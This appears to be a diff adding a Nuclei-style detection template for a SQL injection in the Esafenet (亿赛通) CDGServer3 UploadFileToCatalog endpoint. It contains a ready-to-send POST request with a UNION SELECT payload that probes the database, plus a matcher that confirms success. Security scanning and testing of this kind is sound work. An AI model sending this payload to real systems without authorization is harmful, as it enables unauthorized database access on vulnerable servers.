@@ -1,0 +1,24 @@
+id: esafenet-uploadfiletocatalog-sqli
+
+info:
+  name: 亿赛通 UploadFileToCatalog SQL注入
+  author: SleepingBag945
+  severity: high
+
+http:
+  - raw:
+      - |
+        POST /CDGServer3/js/../policy/UploadFileToCatalog?fromurl=../user/dataSearch.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        id=-999{{url_encode("\' UNION ALL SELECT NULL,ISNULL(CAST(111*111 AS NVARCHAR(4000)),CHAR(32))+\' \'+DB_NAME(),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL")}}--+{{rand_base(4)}}
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains_all(body,"12321")
+
+
+
